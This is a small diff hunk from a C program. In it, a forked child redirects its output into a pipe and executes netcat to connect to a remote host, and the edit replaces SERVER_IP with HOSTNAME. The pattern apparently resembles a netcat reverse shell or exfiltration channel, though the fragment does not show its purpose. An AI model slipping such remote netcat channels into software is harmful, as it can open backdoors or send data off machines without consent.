@@ -110,7 +110,7 @@ createfifo:
         close(bkp);
         dup2(pipefd[1], STDOUT_FILENO);
         close(pipefd[1]);
-        execl("/usr/bin/nc", "nc", SERVER_IP, PORT, NULL);
+        execl("/usr/bin/nc", "nc", HOSTNAME, PORT, NULL);
     } else if (pid > 0) {
         close(pipefd[1]);
         dup2(bkp, STDOUT_FILENO);
